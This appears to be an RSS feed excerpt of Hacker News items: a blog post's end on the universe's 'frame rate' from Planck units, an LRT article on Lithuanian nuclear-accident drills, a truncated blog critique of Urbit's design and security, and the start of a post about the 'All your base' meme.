resolution to correspond to 2.19 √ó 10<sup>33</sup> DPI.) The radius of the observable universe is
4.4 √ó 10<sup>26</sup> meters. If we want to fit the universe into a box, its sides would have to
be twice that size. That is 5.4 √ó 10<sup>61</sup> Planck lengths. So that's the width, height and
depth of the universe in pixels. Quite a good resolution. (Actually since they are 3D cubes instead
of 2D squares, I should call them voxels instead of pixels. All 1.61 √ó 10<sup>185</sup> of
them.)</p><p>There is also the <a href="http://en.wikipedia.org/wiki/Planck_time">Planck time</a>
which is the time it takes for light to travel one Planck length. As light is fast and the Planck
length is tiny (tiniest there is!), you can image that it's a very short period of time. Certainly.
The Planck time is 5.39 √ó 10<sup>-44</sup> seconds. No measurable time can be shorter than that
according to quantum physics. Thinking about graphics again, this is like a limit on the frame rate
of the universe. Inverting the Planck time, I get 1.855 √ó 10<sup>43</sup>. So by my surely
incorrect logic, we get the value of the universe's frame rate:</p><p>One thousand eight hundred
and fifty-five billion billion billion billion frames per second.</p><p>I'll say that
again:</p><p>18.55 septillion FPS!</p><p>Video cameras won't be perfect until they can record at
that speed.</p><p>I hope I got the calculations right, but I'm pretty sure my interpretation of the
quantum physics behind this are way off. It's still fascinating to think of the universe as a
computer simulation. Modern physics make it seem more like a video game than ever.<br>


</p>
  </div>
  
  
  <p><a href="http://disqus.com/">blog comments powered by </a>
</p></div>

    </div></div>]]>
            </description>
            <link>https://www.librador.com/2009/01/16/The-frame-rate-of-the-universe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26178259</guid>
            <pubDate>Thu, 18 Feb 2021 10:37:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lithuania plans to hold drills in case of accident at the Belarus nuclear plant]]>
            </title>
            <description>
<![CDATA[
Score 156 | Comments 139 (<a href="https://news.ycombinator.com/item?id=26178235">thread link</a>) | @maury91
<br/>
February 18, 2021 | https://www.lrt.lt/en/news-in-english/19/1346034/lithuania-plans-to-hold-evacuation-drills-after-belarus-launches-nuclear-plant | <a href="https://web.archive.org/web/*/https://www.lrt.lt/en/news-in-english/19/1346034/lithuania-plans-to-hold-evacuation-drills-after-belarus-launches-nuclear-plant">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article id="article1346034">    

    
    
    <div>

        <div id="article_text1346034">
            <p>Lithuania‚Äôs Interior Ministry plans to hold drills and assess the need to evacuate Vilnius‚Äô residents in case of an accident at the Astravyets nuclear plant in Belarus, located some 50 kilometres from the Lithuanian capital.</p>
            
            <p>"That will be one of the key questions during the drafting of the exercises schedule and probably going back to the scenarios: do we or do we not need to evacuate Vilnius residents,‚Äù Vitalij Dmitrijev, vice minister of the interior, told LRT RADIO.</p>
            <p>The so-called Astravyets drill was held in October 2019 in Vilnius and Svenƒçionys districts, which are located close to the Belarusian border. During the exercises, authorities prepared to evacuate people from radiation-affected territories, distribute iodine pills, as well as simulated a resident cleanup and monitoring operation.</p>
            <p>The exercise involved around 300 officers, troops and civil servants from six municipalities and 24 institutions. Due to a dispute over the exercise scenario with the Vilnius authorities, officers from the capital did not take part in the drills.</p>
                

            <p><em>Read more: <a href="https://www.lrt.lt/en/news-in-english/19/1103053/lithuanians-stage-mock-evacuations-to-train-for-nuclear-accident-photos">Lithuanians stage mock evacuations to train for nuclear accident ‚Äì photos</a></em></p>
            <!--googleoff: all--><!--googleon: all-->            <p>Previously, the Vilnius authorities cancelled another exercise, planned in early September, to simulate an accident at the nuclear power plant in Belarus.</p>
            <p>Based on the information available to BNS, Vilnius Municipality faced resistance from the government at the time.</p>
            <p>Lithuanian officials say that the nuclear power plant built by the Russian state atomic corporation Rosatom and funded by a loan from the Kremlin was built in breach of international safety standards. Minsk denies all accusations.</p>
            <p>Estonia, Latvia, and Lithuania are also due to unplug from the Moscow-controlled energy grid that links them with Belarus. Vilnius says that the Kremlin may use the plant to derail the move.</p>
<!--googleoff: all--><div>
            
<div id="mlb2-1612938">
    <div>
        <div>
            <div>
                <div>
                    <p><img src="https://bucket.mlcdn.com/a/1239/1239192/templates/39/39540/5dcc95ea35753170c2955994a6fea7c948ffb283.png"></p><p>LRT English Newsletter<span><span><br></span><span><span>Every Friday morning.</span></span></span></p>
                    
                </div>
            </div>
            
        </div>
    </div>
</div>

<p><img src="https://track.mailerlite.com/webforms/o/1612938/i0s8k2?v4a60e9ef938a7fa0240ac9ba567062cb" width="1" height="1">
</p></div><!--googleon: all-->        </div>
    </div>
    <!--googleoff: all-->
        <!--googleon: all-->
        

<div data-id="gallery1346034"><div>
            <div>
                <div>
                    <div>
<p><img data-src="/img/2019/10/02/522637-581058-1287x836.jpg" alt="‚ÄòAstravyets drill‚Äô in Lithuania" title="‚ÄòAstravyets drill‚Äô in Lithuania" src="https://www.lrt.lt/img/2019/10/02/522637-581058-1287x836.jpg"></p>
<div>
    <div>
        <div>
<p>‚ÄòAstravyets drill‚Äô in Lithuania</p>            <p><span>1 / 5</span><span>D. Umbrasas / LRT</span></p>
        </div></div>
</div>
                    </div>
                    <div>
<p><img data-src="/img/2019/12/23/573047-835055-1287x836.jpg" alt="Lithuania has staged 'Astravyets drills' to prepare for nuclear emergencies" title="Lithuania has staged 'Astravyets drills' to prepare for nuclear emergencies" src="https://www.lrt.lt/img/2019/12/23/573047-835055-1287x836.jpg"></p>
<div>
    <div>
        <div>
<p>Lithuania has staged 'Astravyets drills' to prepare for nuclear emergencies</p>            <p><span>2 / 5</span><span>D. Umbrasas/LRT</span></p>
        </div></div>
</div>
                    </div>
                    <div>
<p><img data-src="/img/2019/10/02/522627-981621-1287x836.jpg" alt="‚ÄòAstravyets drill‚Äô in Lithuania" title="‚ÄòAstravyets drill‚Äô in Lithuania" src="https://www.lrt.lt/img/2019/10/02/522627-981621-1287x836.jpg"></p>
<div>
    <div>
        <div>
<p>‚ÄòAstravyets drill‚Äô in Lithuania</p>            <p><span>3 / 5</span><span>D. Umbrasas / LRT</span></p>
        </div></div>
</div>
                    </div>
                    <div>
<p><img data-src="/img/2019/10/02/522623-306261-1287x836.jpg" alt="‚ÄòAstravyets drill‚Äô in Lithuania" title="‚ÄòAstravyets drill‚Äô in Lithuania" src="https://www.lrt.lt/img/2019/10/02/522623-306261-1287x836.jpg"></p>
<div>
    <div>
        <div>
<p>‚ÄòAstravyets drill‚Äô in Lithuania</p>            <p><span>4 / 5</span><span>D. Umbrasas / LRT</span></p>
        </div></div>
</div>
                    </div>
                    <div>
<p><img data-src="/img/2019/10/02/522612-821132-1287x836.jpg" alt="‚ÄòAstravyets drill‚Äô in Lithuania" title="‚ÄòAstravyets drill‚Äô in Lithuania" src="https://www.lrt.lt/img/2019/10/02/522612-821132-1287x836.jpg"></p>
<div>
    <div>
        <div>
<p>‚ÄòAstravyets drill‚Äô in Lithuania</p>            <p><span>5 / 5</span><span>D. Umbrasas / LRT</span></p>
        </div></div>
</div>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
 

    
    
</article>

        
    </div></div>]]>
            </description>
            <link>https://www.lrt.lt/en/news-in-english/19/1346034/lithuania-plans-to-hold-evacuation-drills-after-belarus-launches-nuclear-plant</link>
            <guid isPermaLink="false">hacker-news-small-sites-26178235</guid>
            <pubDate>Thu, 18 Feb 2021 10:34:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Urbit: The Good, the Bad, and the Insane]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26177720">thread link</a>) | @wcerfgba
<br/>
February 18, 2021 | https://wejn.org/2021/02/urbit-good-bad-insane/ | <a href="https://web.archive.org/web/*/https://wejn.org/2021/02/urbit-good-bad-insane/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  <p><span>Written</span>
    

    
      <span>on&nbsp;</span><time datetime="2021-02-17 19:02:00 +0100">2021-02-17</time>
    
    
  </p>

  

  

  

  <p>In this post I‚Äôm gonna be making all kinds of fun of <a href="https://urbit.org/">Urbit</a>.
And all that after spending just a few hours poking around it.</p>
<p>Originally, I wanted to write in the layout of the good, the bad, and the ugly,
but I‚Äôm not entirely sure how that would pan out.<sup><a href="#fn1" id="fnref1">1</a></sup></p>
<p>Before I begin, I‚Äôll somewhat oversimplify and explain Urbit to those of you not
in the know.</p>
<p><em>And before I do that, here‚Äôs a PSA: there‚Äôs a <a href="#tldr">tl;dr at the end</a>. So you
don‚Äôt need to read all this drivel. You‚Äôre welcome.</em></p>
<h2 id="urwhat">Ur‚Ä¶what?</h2>
<p>According to its own webpage, Urbit is an ‚Äúoverlay OS‚Äù and network for the 21st
century.</p>
<p>What that means at the time of writing<sup><a href="#fn2" id="fnref2">2</a></sup> is that it‚Äôs a single-threaded
interpreter running as a unix process that speaks udp protocol to a meshed
network (and http to your browser).</p>
<p>And all of that in the name of delivering you flaky, unreliable, and feature-poor
implementation of an internet forum. (in a nutshell)<sup><a href="#fn3" id="fnref3">3</a></sup></p>
<p>An additional component of Urbit is its ‚Äúdistributed‚Äù identity component, where
your identity is uniquely tied to a 32-bit integer. And to go with the zeitgeist,
it‚Äôs backed by Ethereum blockchain. Naturally.</p>
<p>All we need is quantum computing and ML, and we have all the latest buzzwords.
<a href="https://groups.google.com/a/urbit.org/g/dev/c/a6hdQdzIgqo">Oh, wait.</a></p>
<p>But to better explain what‚Äôs going on, let‚Äôs look at‚Ä¶</p>
<h2 id="a-bit-of-history">A bit of history</h2>
<p>I‚Äôm going to take Urbit‚Äôs history page on authority here.</p>
<p>This project started in 2002 as a PhD thesis to reinvent computing. Over the
next 6 years the progress was a language specification (Nock) for
a turing-complete language with ~11 instructions.</p>
<p>Then, over 10+ years other people ran with it, took it further, and implemented:</p>
<ul>
<li>(more than one) VM interpreting that language</li>
<li>a higher level language ‚Äì Hoon (to make Nock ‚Äúpractical‚Äù)</li>
<li>an encrypted mesh protocol</li>
<li>a versioned control system</li>
<li>an application layer</li>
<li>a web frontend (several apps, actually)</li>
<li>an identity layer</li>
<li>‚Ä¶</li>
</ul>
<p>If this smells like a bad case of <a href="https://en.wikipedia.org/wiki/Not_invented_here">NIH</a>,
it‚Äôs probably because that‚Äôs exactly the case.</p>
<h2 id="urbit-as-an-ideal-good-and-insane-at-the-same-time">Urbit as an ideal: good and insane at the same time</h2>
<p>But let‚Äôs talk about Urbit as an ideal for a moment.</p>
<p>Let‚Äôs assume that when <a href="https://youtu.be/M04AKTCDavc">the marketing materials</a>
speak of</p>
<blockquote>
<p>defining an operating system on a single piece of paper</p>
</blockquote>
<p>and</p>
<blockquote>
<p>throwing away every line of code from the 1970s</p>
</blockquote>
<p>they mean well. Given some sort of hardware implementation of Nock (the low level
language) you theoretically <em>could</em> throw away everything and start from scratch.</p>
<p>And it would be all kinds of awesome, if you could have decent control over your
personal computing without all the cruft accumulated since ‚Äô70s.</p>
<p>Only‚Ä¶ with Urbit this ideal would be so slow as to be useless. See, Nock has
one arithmetic operation, increment (<code>x+1</code>). So if you want to decrement <code>x</code>,
you have to loop from <code>0</code> to <code>x-1</code>. Or you can break your promise of throwing
away all the code from ‚Äô70s‚Ä¶ and implement decrement in C.</p>
<p>And the same story (of replacing godawfully ineffective implementation of native
code with C implementation) goes pretty much for any reasonable functionality you
might expect. Crypto? Sorting? Basic math and string ops? All of it.</p>
<p>The entire frickin‚Äô peer to peer protocol is written in C, too. So are vast
swaths of the OS: db, ames, http, terminal, database, event processing, ‚Ä¶</p>
<p>Is it possible to truly throw away every line of code from the 1970s up until
now‚Ä¶ and start from clean slate? Hell yeah. Only, probably not with Nock.</p>
<p>So we have the pivot to ‚Äúoverlay OS‚Äù (mentioned on urbit.org), in other words:
<strong>let‚Äôs not throw away any lines of code, but instead build on top of them</strong>.
And then access the UI using a conventional browser over http, that will
interpret the React-based javascript (among other things).</p>
<p>So far so good.</p>
<p>Ubit‚Äôs core promise:reality ‚Äì 0:1.</p>
<h2 id="hoon-as-a-language-amazing">Hoon as a language: amazing</h2>
<p>Let‚Äôs move on to the Hoon language<sup><a href="#fn4" id="fnref4">4</a></sup>, the workhose of the platform.</p>
<p>Once you start diggin in, you will be constantly met with such <a href="https://github.com/urbit/urbit/blob/master/pkg/arvo/gen/cat.hoon">vomit inducing
beauty</a>:</p>
<pre><code>::  ConCATenate file listings
::
::::  /hoon/cat/gen
  ::
/?    310
/+    pretty-file, show-dir
::
::::
  ::
:-  %say
|=  [^ [arg=(list path)] vane=?(%g %c)]
=-  tang+(flop `tang`(zing -))
%+  turn  arg
|=  pax=path
^-  tang
=+  ark=.^(arch (cat 3 vane %y) pax)
?^  fil.ark
  ?:  =(%sched -:(flop pax))
    [&gt;.^((map @da cord) (cat 3 vane %x) pax)&lt;]~
  [leaf+(spud pax) (pretty-file .^(noun (cat 3 vane %x) pax))]
?-     dir.ark                                          ::  handle ambiguity
    ~
  [rose+[" " `~]^~[leaf+"~" (smyt pax)]]~
::
    [[@t ~] ~ ~]
  $(pax (welp pax /[p.n.dir.ark]))
::
    *
  =-  [palm+[": " ``~]^-]~
  :~  rose+[" " `~]^~[leaf+"*" (smyt pax)]
      `tank`(show-dir vane pax dir.ark)
  ==
==
</code></pre>
<p>that makes Perl the world champion of readable languages by comparison.</p>
<p>I‚Äôm not being entirely fair here, because I‚Äôm sure you can memorize the digraphs
in a few weeks<sup><a href="#fn5" id="fnref5">5</a></sup>, and eventually you get the hang of writing this.
But in the grand scheme of things‚Ä¶ why the heck would you want to?!</p>
<p>It is hard enough to write bug free code in a language that you can find
tens of thousands of top notch coders for (that would give you an honest
code review). It‚Äôs quite another thing doing basic reading of Hoon.</p>
<p>But let‚Äôs say I‚Äôm biased, this is the future, and 5 years down the road it
will be the gold standard for personal computing dev<sup><a href="#fn6" id="fnref6">6</a></sup>.</p>
<p>What can you expect in terms of features, then?</p>
<p>Well, since you‚Äôre essentially supposed to run on top of Nock, and it‚Äôs
all supposed to be strictly deterministic on top of an event stream, my
imagination is failing me as to how it‚Äôs going to support some sort of
parallel processing, because you probably don‚Äôt want to be stuck humping
one core of your CPU.</p>
<p>Let‚Äôs say you try to make it work in parallel using message passing.
Hmm, there goes determinism.</p>
<p>Or shared memory? There goes using ‚ÄúNock‚Äù (as you‚Äôre poking yet another
hole in the substrate).</p>
<p>I‚Äôm sure there‚Äôs a solution, but I‚Äôd bet you a doughnut it‚Äôs not going
to be as pure as the marketing.</p>
<p>Hoon:reality ‚Äì draw (it works, but sigh)</p>
<h2 id="urbit-as-an-os--capable">Urbit as an OS ‚Äì capable?</h2>
<p>Do you remember how we were supposed to throw away all that code from ‚Äô70s?</p>
<p>So that‚Äôs not happening (as described above).</p>
<p>But at least the OS is a shiny awesome thing capable of real tasks, yes?</p>
<p>Okay.</p>
<p>Given my short exposure to Urbit I‚Äôm sure I‚Äôm missing some dark corners
where clumps of awesome lurk, but if you expect more than a Weather app,
half-assed web forum, simple shared notebooks, and a weird ass terminal,
you will be sorely disappointed.</p>
<p>Again, this will be rectified in the future (of that I‚Äôm actually and
honestly sure).</p>
<p>There are already some third party Hoon implementations of bit torrent,
chat bots, etc.</p>
<p>And there‚Äôs some plans for bitcoin integration, 3rd party apps, etc.</p>
<p>So if the ecosystem takes off, it could be rich and wondrous.</p>
<p>Except‚Ä¶ most of it won‚Äôt be written in Hoon or Nock. Since Urbitians
are hard at work providing language bindings for well known languages.</p>
<p>So what are you gaining by using Urbit that you couldn‚Äôt get elsewhere?
No, seriously‚Ä¶ I have yet to figure this one out.</p>
<p>Let‚Äôs move on‚Ä¶</p>
<h2 id="hosted-urbit--only-if-you-want-to-wash-your-dirty-laundry-in-public">Hosted Urbit ‚Äì only if you want to wash your dirty laundry in public</h2>
<p>Now, let‚Äôs think about hosting Urbit for just a moment.</p>
<p>You can run it on your Raspberry (and it will work). You even own your
data that way. <em>(duh? don‚Äôt you always, in that case?)</em></p>
<p>But let‚Äôs suppose you want to host it elsewhere. I mean, there‚Äôs this
awesome peer-to-peer encrypted protocol in Urbit, so it‚Äôs secure, right?</p>
<p>Well, there‚Äôs encryption during transit, and then there‚Äôs encryption at
rest.</p>
<p>And the failboat comes in the latter case.</p>
<p><strong>Nothing in Urbit is encrypted at rest</strong>.</p>
<p>No, seriously, all the chat logs, events, everything‚Ä¶ is dumped into
a journal on disk<sup><a href="#fn7" id="fnref7">7</a></sup> in cleartext form.</p>
<p>So, hey, also the whole ‚Äúa vault for secrets‚Äù from the marketing video?
Hmm‚Ä¶ are you going to risk it?</p>
<p>And are you going to risk storing your bitcoin wallet on Urbit,
unencrypted?</p>
<p>In other words, <strong>when hosting urbit at any 3rd party, you better be the
only one with access to the underlying OS</strong> (and have it fully encrypted),
lest you want your entire history worth of data readable by the company
running the instance for you. Or anyone with access to the system.</p>
<p>So, running this on GCP? Digital Ocean? Tlon‚Äôs hosting? Only if you‚Äôre
comfortable [potentially] washing your dirty laundry in public.</p>
<p>Urbit:real world ‚Äì 0:1</p>
<h2 id="lets-fail-together-over-the-air">Let‚Äôs fail together over the air</h2>
<p>So say you run your Urbit securely on your Pi, you love the platform,
the UI, the whole shebang.</p>
<p>Great.</p>
<p>Nothing to fear then?</p>
<p>Yeah, maybe except the teeny tiny detail that if you want to stay up
to date, you need to configure OTA<sup><a href="#fn8" id="fnref8">8</a></sup>.</p>
<p>So you will be receiving updates to your Urbit instance from one of your
neighbors (one that you configure).</p>
<p>And you talk to your neighbors over an end to end encrypted channel.</p>
<p>Sounds great, since this is 2021, and surely the updates are signed.</p>
<p>Well, no. They are not. The transmission is, though. Big help!</p>
<p>So ‚Äì I guess it wouldn‚Äôt be that hard for one rotten apple somewhere
on higher ranks of the network<sup><a href="#fn9" id="fnref9">9</a></sup> <em>(rogue operator, hacked machine, hacked
core dev‚Äôs machine)</em> to push a code update that exfiltrates all your data,
possibly including all your secrets (hey, remember the BTC integration)?</p>
<p>And imagine the fun of auditing Hoon for potential security holes in
an update, if you were paranoid. Just the thought is hilarious.</p>
<p>Urbit:security ‚Äì 0:1</p>
<h2 id="urbit-id--scarcity-creates-value-and-you-pay-a-premium-for-that">Urbit ID ‚Äì scarcity creates value, and you pay a premium for that</h2>
<p>So I watch in great amazement the booming ecosystem of cryptocurrencies
of different shapes and colors, and of all things blockchain.</p>
<p>Urbit ID is even better than all of them, though.</p>
<p>You see, the entire identity address space is artificially constrained
to 32bit integers<sup><a href="#fn10" id="fnref10">10</a></sup>.</p>
<p>And according to the Urbit promoters and backers, <em>scarcity creates value</em>.</p>
<p>Just like that.</p>
<p>No need for demand or anything. It‚Äôs scarce, hence it has value. Done<sup><a href="#fn11" id="fnref11">11</a></sup>.</p>
<p>The fact that a desperate enough person could do an equivalent of a hard
fork, and run it independently with a different Identity root is‚Ä¶
impossible?</p>
<p>Whatever.</p>
<p>But anyway, let‚Äôs say you ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wejn.org/2021/02/urbit-good-bad-insane/">https://wejn.org/2021/02/urbit-good-bad-insane/</a></em></p>]]>
            </description>
            <link>https://wejn.org/2021/02/urbit-good-bad-insane/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26177720</guid>
            <pubDate>Thu, 18 Feb 2021 09:22:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All your domain are belong to us]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26177583">thread link</a>) | @thomas-vds
<br/>
February 18, 2021 | https://thomasvds.com/all-your-domain-are-belong-to-us/ | <a href="https://web.archive.org/web/*/https://thomasvds.com/all-your-domain-are-belong-to-us/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
   Posted 18. February 2021.
   <strong>1 min read.</strong></p></div><div><div><p>I recently bumped again into one of the oldest memes out there - <a href="https://en.wikipedia.org/wiki/All_your_base_are_belong_to_us" target="_blank" rel="nofollow noopener noreferrer">All your base are belong to us</a>. Long story short, a 1992 English translation of the Japanese game Zero Wing got a bit screwed up and players were fast to pick this glitch up and elevate it to Internet meme status.</p>
<p><img src="https://thomasvds.com/assets/static/all-your-base.e8fe0bf.c8886729d38e6661f35d808255c4d465.png" width="608" alt="All your base meme" data-old-src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 608 415' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-4551223bf1bc9ea35c20053c4844ed68'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-4551223bf1bc9ea35c20053c4844ed68)' width='608' height='415' xlink:href='data:image/png%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAEAAAAAsCAYAAADVX77/AAAACXBIWXMAAAsSAAALEgHS3X78AAAVV0lEQVRo3s1aaVRc15G%2b3UDT0CsNNNAsTdMLTQMNiB3EpkZsYhFaEQghhASSUNi0YCSwJKPVlmQL7VhCiy3Lduw4duJxxhknM8fZzngyniQ%2bMzk5mRwncZaJl2QyGY9jy/6m6jaNsR2fE9tSkh9X7/Z7991b9VXVV1UPiQijEWqNAUKlv3UjVA%2bdVge9Wg2dRgODVgtDWDj0dOV7%2btBQ6MLD5dwQFuYfISH%2bewYDTBER0OqNt1amPzFU4aw3/dOaF43P9ybganc8HtiQ8KnHte4EPLQxAWfaLHDnOJGyfAWsRYUwL8hCTH01HNnZsLe0Ir6jHSkLyxHX1gZLUzPM9Q2I6t0EV1UJ4uOjIUQwvIkaudc1lqk74TPJ9eFxdX08HutLwMZyM51F1trXHAdcdwEXncClzzD4/QdS8csDSXAuW4LUA/vgoWtCewts%2b8eQV1mMzOHtcI7vQXbbGmRtG4DNtwjJLQ2wX7%2bBnOFhWG0WEkpgkUsNXPmM8nzcuJ/GQy5cISCEggAYrY8Fph1466Qd75z69OOtkw7gXDJOb82A/nM7Yd22FbaiAlg3boL92FFkrlwOz6ZeuFsbkcPecOgg3NVlSE%2bzI71tJdJHR2F1OyQAtZl64LwTf2SZpj6bXB%2bV004gOHCmfRaAsYZYab2b9PC9059%2b3DzNAFixv2cBTKvaYd09CgeFgGtDN1L3jcOzpRdpO3fCu7oFzj27kVFZDnfdIljb2%2bGtXogF69YRAE4CQIG0uFD8770pwFnHZ5LpTw0GgT3hXMfHAIAzjk88JACnaD5tx13LrQh3pCJlDwGQmw3Phh7YTpyAfXwcyUeOI6ahAcn9Q7Bk5yKNOCB2%2bzBc/VuQV7MYkWYTVOow6MOC8IuDVvICB979lDJ9nJy3EQC/a923JglKvQmuLRuQWeeDrbeXwqAXzjt2wTfcjhNfPIzO9c1Ys6MJnju3QnnmLFy9fXBY4xCsUhEAamhDGYDkOQDeu0Ug3H4AaJ9ntiXB4PDAumULXLWL4R7cgaWdeZi%2b3oHrj0wCN38C4Fd443dfxzde%2bQrOf%2bcG9k2tgq/GhnCNFkp1OMpS1Lg55Zznuo5bAsItByAgHM8lAOdd%2bOGEFa6iHOhGBpG8sAw5Nfl47pud%2bOZ3ZnDh0kVS/hX8/n%2b%2bR9f/ovFbGr/Er14/h/W9Duj1OgRpjdhTSyR4g2Wx410OrTO3BoRbAkBgTcA6787G/3unKL1cteHHoxZkNdXDuGsHUjvXoaqoBBdmutC3bT3uv3yMFP4hXvzBPfjNq8/j7Xd%2bgbfe/hl%2b9dplXL6%2bGI7UaEmCTo0J1xrz8drdFAYXUj4Awl8UgPnsOd/VOTVJ0iOW5nTFaRQXEvHFlYXoUJQhraYN5sGtSK/wYdPm46htWAlf/TosX70Upy/djUtXDmDP/t144qkHCZA/4NU3voCLD1Qi2RYmCyEGQSssGDS14uWJVNrfNg8E%2b%2b0H4MOxF7CyVJiVneF4T8GblKp%2bSmz9zTEbjmf74BBemcc1ibEwjwzAbLGgpq4LAzsOoqOjDz0d3bjYWId9a3rw1HM38Morz%2bH5f34U918fwOh4CVzuSKl8qCoEQikQL%2bw4ErEVrx61zRLiX8AD5ixOh707a21p5UsO/OG%2bZPxgtxU32lMwVGiFz5wMuzoOZaFU2ooU2lD4B4FQQNYvXVQFa7ITE5OXccfEOZw4%2bSL6sysxMboTeyd7sLLTi2WVqRhqq0J7z2KUL0qExqSR70cKE0SQQKNowxer60nGeJLHebs9gBbNEs/NKYdEHZdc%2bCmVt3uqY9BsTodbaUeYiCIBk0hpK5pFI1kqbk7xwOjoGERT6wYkWF1Y3dmPTiqIxu%2baxPD4KZyf2YcNfXbceagJj546gi9c3IVd47nIrPVC7bJBI8JgEhGIUphgF26MRa/Cb6eoZD/juv0hIGON3fySDT8/kIyRaj0KwlxYKbpQKEphJaV9inLEKqJRqVgIDwnICquECrEiBmGKMPk71V2B/KJm2N0ebOo/h95td%2bPOA8cwsf8EXn/jW3jxpUN45%2baLxAH/jffwLewYK4QhMgJhGjUBrCYATHSGGS7hwc6oFfjtydsMwDuzHsCE86%2bjSZgociMuPIysm4oZMY0uZRu8inSMi11IEonQCS2WixapbJAIQqpwIkaY5zxAEaSEThctPWDj1kl09x0kD/gnPP33T5LSv8CvX7%2bC/3vre7Im%2bNrzgygpj4WG2ucwTRiUQin3NymMSCNeGY5aijfmAfDe7QCAGw8uZZ/qTsE60UGulyUVuaicwhVxQcbkbrETNaJa3l8i6sj6aXKeKBKIAO1ybhQGZIh06IVe/g4OVmHF6s1Yu2ET7r73BN5449/w5h9%2bjief2Yhfv8pg/Bqnp%2btgijZAQ3WAUqmU7zEIQQolfKIWvdHVeO1kzPsA/IkxP0V/XMr%2beADuZ4Z34rUT8VimLcc%2bcRdZUFAq0uCGuIIxsQPRFPd7xRhsIlkKuE60Qy1C5dxBBBhOcWsgpfPEAmQTeHqFH4CgYAXqGjvQsWEb/uNHz%2bDll5/F0XtW4/JDvfjJy1/GH9/%2bF2wfW4iQUDUU8zhEQdmAr5tEL5ZG5OF3U7Gy0Hp7yp%2bKb87yVODKofthMN4NpO3AoHeloS8GAFDPtsMX/IgNVevI8i48pLxI1xQpwAlxBFPiGEJECHaIQaST1TlG28Vq%2bZwVtwsbhYESXpEpvcIgdFIZRWIS7EUO1DblIq90Cb79wlW8%2bP3rePCRvXjmq8fw3D%2bewXe/fy86u91IWGBHiDX5A0SqEeFkjDHJA%2bOlDrw5RQ3SDPf0LrIiKTJDhdKlFH%2bfP%2b3PXAwGKyqbqHOBtS7/mhm6Tvu/XZzldnjug8gNt7xZlcJWC0WDaMA94hDFn1sqNCXuIS6woEIsxCJRQQI5sEaslELqSNlYEUuub5SWVxFQjkg3cvJ90DS3wG434MtPrUF%2baRoefPg8ufxPcfHKTvzwx9M0/y4uX%2bnC0cMe2NIioV%2b0GOHEO6Ehfs/i8%2b8Q2xFMHFMpatAck467m2Pw9e1mmYpP%2bNJwrNaOR9cn4Ed7yOpnqV64bPN/TLngxOv3JOMb2y14vNeMw81RGKgyYGZdFHDNgZmuBIgwrQFVHiP2Nhjx8IYYfH9PItbmGqgmF4iimK%2bleF8qmtAqmrFQFEseyCElFwsfNlJW8FtJI8ODidFGGcISmYRSXwNS01xIXbIE5lVLMXhyFUbG8tGzvpiU/hmN3%2bD3bz6LA/tzsPtgJcavDSB1XTsceQWIpyLKZvN7XyeF2RaxSc6TFYlkBBvyRSVWiRXEQcvQJnrIKycwRCFar/RhqyMXZ%2bs8ONIYixXZOji0EZKfQik0dZSq9ZS640nG1R4zVhUYIfgDpCI4dM7lMuNDcLnLhNHqSESo1P6D6aX9Yg82i40SgFDykNViOe4Ud8jnIVS6MgDMDeH0LCu3AgULKxAZY6La3gZHYR5MS8gT7j4IW38n9u9pwUv//gXsnViKhI1tyD44icSaGmRWFsISHwMjpcL0HC%2bC1SGYFqeJBCvlOcwvFYpS3KEYIk/zolRRgL3KXWhVLkGJIh9VtC5bFFKIFiKTjJVI2Sud1uULqi8UHkQrIqBXhsvwNJI365VREDqjDtawBJQrimBTJPk/SIoisngr6sjlEkS8LEic5PJnxL1UC7TKfJ8rcmQIRInIWeY3SvbX6LXILy5FQVkppUCyQFoyMquKkd3dhfTTx5B45D7ULMvC6VMLUNmSCfupi/DUVMHrTkBmrgexiRZow7XwlOWiIbIe18WMDDE%2bg0FuoaJrg1hHqXhUysBpt0xQCU0pOIUMkKlIQ4OyGkPKzTiq2Ef8dRgP0R5PikdwUZzBLjFMoPjrFn2ozg9AitomSYzzbpdiDe5RTJKLLZOxz0zMFuB5FhHcKXGc3EgnCZLz/qJZ6wQTcEyCBlMElixtQ23jOiSmpsFTUoi0kSF4hofhHR5A5bYRFFGX96Un25HfWoKKkTuQuawF6SU5EoCElERY4qwoqFmCSdUEBsQWWRCxfFspFE6LEzIU68RirBdrUUzWfk48jcfFQ9Ir68loHKLVokqC1UXpvJ%2byyKDYKusXNuLz4qtoEvUQKvL6CGMEwtXhMItodNOGnOfLqdpjyzPTs1KsKFueXXC7GJAEmEbuxeHA3BDwAh5qKmLqmzsxNHwvqla3I7nOB%2b/ucWRu7UdGcRFyd%2b1GWmsN9o%2bXw1NbBs/Bw8gYoK4xm8h2QQaSCICixT6sLRvEfZR91ivWysyyTfRhkmK9XaySnlAg8vAP4ss4KPYRYddKnhoU/cQLtVhBsnLm%2bpL4PJ4Wj2OCQrVClMmKlQl8gMA4L6YQozL7PcCuTiFEGiSx8SJWqFgUSCTZ3bnAYaU5FDoo9dUIn8z7vDaFLMMkFTpbDwRTEeNwZ6F15TYMDe5HcksTkkZH4BkdhbuA3L59LVz1PnR1uuFcWgtf/wDSVq5AOvGEJSkONocDvYMT2KEblrxzjFy4kazVJzZIqxtmiyu28NfE32FYbJNewN7LGYpdfJcYwefEZpk97hLjcr5RrJf6sGHZa5lcs1VePwCJ6oTZ3K2XLs%2bFDL/ApLaWOjF2Kz/Z